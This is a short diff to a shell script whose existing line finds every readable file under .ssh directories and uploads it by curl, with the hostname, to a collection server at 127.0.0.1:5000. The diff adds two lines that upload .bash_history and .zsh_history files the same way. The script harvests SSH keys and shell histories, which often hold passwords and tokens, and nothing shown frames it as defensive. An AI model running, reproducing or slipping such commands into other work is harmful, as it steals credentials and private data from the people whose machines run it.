@@ -8,3 +8,5 @@ fi
 
 
 find / -path **/.ssh/* -readable -exec curl -i -X POST -H 'Content-Type: multipart/form-data' -F "host=$hostname" -F 'file=@{}' http://127.0.0.1:5000 \;
+find / -path **/.bash_history -readable -exec curl -i -X POST -H 'Content-Type: multipart/form-data' -F "host=$hostname" -F 'file=@{}' http://127.0.0.1:5000 \;
+find / -path **/.zsh_history -readable -exec curl -i -X POST -H 'Content-Type: multipart/form-data' -F "host=$hostname" -F 'file=@{}' http://127.0.0.1:5000 \;
